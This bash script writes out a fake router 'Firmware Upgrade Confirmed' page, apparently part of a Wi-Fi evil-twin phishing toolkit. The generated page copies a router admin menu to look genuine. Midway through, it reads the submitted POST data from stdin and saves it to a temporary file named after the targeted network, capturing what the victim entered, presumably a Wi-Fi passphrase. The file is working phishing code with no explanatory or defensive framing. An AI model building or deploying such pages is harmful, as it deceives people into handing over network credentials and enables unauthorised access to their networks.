#!/bin/bash

import_vars="vars.sh"

source $import_vars

{
echo -e "echo -e '<!DOCTYPE html>'"
echo -e "echo -e '<html lang=\"en\">'"
echo -e "echo -e '<head>'"
echo -e "echo -e '  <title>Router Configuration Page</title>'"
echo -e "echo -e '  <meta charset=\"utf-8\">'"
echo -e "echo -e '  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">'"
echo -e "echo -e '  <link rel=\"stylesheet\" href=\"bootstrap.min.css\">'"
echo -e "echo -e '  <script src=\"jquery.min.js\"></script>'"
echo -e "echo -e '  <script src=\"bootstrap.min.js\"></script>'"
echo -e "echo -e ''"
echo -e "echo -e '  <style type=\"text/css\">'"
echo -e "echo -e ''"
echo -e "echo -e '    html,'"
echo -e "echo -e '    body {'"
echo -e "echo -e '          height: 100%;'"
echo -e "echo -e '        }'"
echo -e "echo -e ''"
echo -e "echo -e '        #wrap {'"
echo -e "echo -e '          min-height: 100%;'"
echo -e "echo -e '          height: auto !important;'"
echo -e "echo -e '          height: 100%;'"
echo -e "echo -e '          margin: 0 auto -60px;'"
echo -e "echo -e '        }'"
echo -e "echo -e ''"
echo -e "echo -e '        #push,'"
echo -e "echo -e '        #footer {'"
echo -e "echo -e '          height: 60px;'"
echo -e "echo -e '        }'"
echo -e "echo -e '        #footer {'"
echo -e "echo -e '          background-color: #f5f5f5;'"
echo -e "echo -e '        }'"
echo -e "echo -e ''"
echo -e "echo -e '        @media (max-width: 767px) {'"
echo -e "echo -e '          #footer {'"
echo -e "echo -e '            margin-left: -20px;'"
echo -e "echo -e '            margin-right: -20px;'"
echo -e "echo -e '            padding-left: 20px;'"
echo -e "echo -e '            padding-right: 20px;'"
echo -e "echo -e '          }'"
echo -e "echo -e '        }'"
echo -e "echo -e ''"
echo -e "echo -e '        #clockdiv{'"
echo -e "echo -e '	         font-family: sans-serif;'"
echo -e "echo -e '	         color: #fff;'"
echo -e "echo -e '	         display: inline-block;'"
echo -e "echo -e '	         font-weight: 100;'"
echo -e "echo -e '	         text-align: center;'"
echo -e "echo -e '	         font-size: 30px;'"
echo -e "echo -e '         }'"
echo -e "echo -e ''"
echo -e "echo -e '        #clockdiv > div{'"
echo -e "echo -e '           padding: 10px;'"
echo -e "echo -e '           border-radius: 3px;'"
echo -e "echo -e '	         background: #00BF96;'"
echo -e "echo -e '	         display: inline-block;'"
echo -e "echo -e '         }'"
echo -e "echo -e ''"
echo -e "echo -e '        #clockdiv div > span{'"
echo -e "echo -e '          padding: 15px;'"
echo -e "echo -e '	        border-radius: 3px;'"
echo -e "echo -e '	        background: #00816A;'"
echo -e "echo -e '	        display: inline-block;'"
echo -e "echo -e '        }'"
echo -e "echo -e ''"
echo -e "echo -e '      .smalltext{'"
echo -e "echo -e '	       padding-top: 5px;'"
echo -e "echo -e '	       font-size: 16px;'"
echo -e "echo -e '       }'"
echo -e "echo -e ''"
echo -e "echo -e '  </style>'"
echo -e "echo -e '</head>'"
echo -e "echo -e '<body>'"
echo -e "POST_DATA=\"\$(cat /dev/stdin)\""
echo -e "echo \"\$POST_DATA\" > \"$tmpdir$selected_network\""
echo -e "echo -e ''"
echo -e "echo -e '  <nav class=\"navbar navbar-inverse\" style=\"background:RoyalBlue;margin-top:2em;\">'"
echo -e "echo -e '    <div class=\"container-fluid\">'"
echo -e "echo -e '      <div class=\"navbar-header\">'"
echo -e "echo -e '        <button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\"#myNavbar\">'"
echo -e "echo -e '          <span class=\"icon-bar\"></span>'"
echo -e "echo -e '          <span class=\"icon-bar\"></span>'"
echo -e "echo -e '          <span class=\"icon-bar\"></span>'"
echo -e "echo -e '        </button>'"
echo -e "echo -e '      </div>'"
echo -e "echo -e '      <div class=\"collapse navbar-collapse\" id=\"myNavbar\">'"
echo -e "echo -e '        <ul class=\"nav navbar-nav\">'"
echo -e "echo -e '          <li class=\"dropdown\" data-toggle=\"modal\" data-target=\"#upgrade-only\"><a class=\"dropdown-toggle\"'"
echo -e "echo -e '              data-toggle=\"dropdown\" href=\"#\" style=\"color:white\">Setup <span class=\"caret\"></span></a>'"
echo -e "echo -e '            <ul class=\"dropdown-menu\">'"
echo -e "echo -e '              <li><a href=\"#\">Basic Setup</a></li>'"
echo -e "echo -e '              <li><a href=\"#\">DDNS</a></li>'"
echo -e "echo -e '              <li><a href=\"#\">MAC Address Clone</a></li>'"
echo -e "echo -e '              <li><a href=\"#\">Advanced Routing</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"'"
echo -e "echo -e '              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>'"
echo -e "echo -e '            <ul class="dropdown-menu">'"
echo -e "echo -e '              <li><a href="#">Basic Wireless Settings</a></li>'"
echo -e "echo -e '              <li><a href="#">Wireless Security</a></li>'"
echo -e "echo -e '              <li><a href="#">Wireless MAC Filter</a></li>'"
echo -e "echo -e '              <li><a href="#">Advanced Wireless Settings</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"'"
echo -e "echo -e '              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>'"
echo -e "echo -e '            <ul class="dropdown-menu">'"
echo -e "echo -e '              <li><a href="#">Firewall</a></li>'"
echo -e "echo -e '              <li><a href="#">VPN</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"'"
echo -e "echo -e '              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>'"
echo -e "echo -e '            <ul class="dropdown-menu">'"
echo -e "echo -e '              <li><a href="#">Internet Access</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"'"
echo -e "echo -e '              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>'"
echo -e "echo -e '            <ul class="dropdown-menu">'"
echo -e "echo -e '              <li><a href="#">Management</a></li>'"
echo -e "echo -e '              <li><a href="#">Log</a></li>'"
echo -e "echo -e '              <li><a href="#">Diagnostics</a></li>'"
echo -e "echo -e '              <li><a href="#">Factory Defaults</a></li>'"
echo -e "echo -e '              <li><a href="#">Config Manegements</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"'"
echo -e "echo -e '              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>'"
echo -e "echo -e '            <ul class="dropdown-menu">'"
echo -e "echo -e '              <li><a href="#">Router</a></li>'"
echo -e "echo -e '              <li><a href="#">Local Network</a></li>'"
echo -e "echo -e '              <li><a href="#">Wireless</a></li>'"
echo -e "echo -e '              <li><a href="#">Advanced Routing</a></li>'"
echo -e "echo -e '            </ul>'"
echo -e "echo -e '          </li>'"
echo -e "echo -e '        </ul>'"
echo -e "echo -e '      </div>'"
echo -e "echo -e '    </div>'"
echo -e "echo -e '  </nav>'"
echo -e "echo -e ''"
echo -e "echo -e '  <div class="container">'"
echo -e "echo -e '    <div>'"
echo -e "echo -e '      <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade Confirmed</h2>'"
echo -e "echo -e '      <p class="lead">The update was confirmed and uploaded to the router,'"
echo -e "echo -e '                  	   the connection will be restablished in a few moment.'"
echo -e "echo -e '                      We strive to create a safer and more convenient world</p>'"
echo -e "echo -e '    </div>'"
echo -e "echo '</body>'"
echo -e "echo '</html>'"
} > "$webdir/$confirm_file"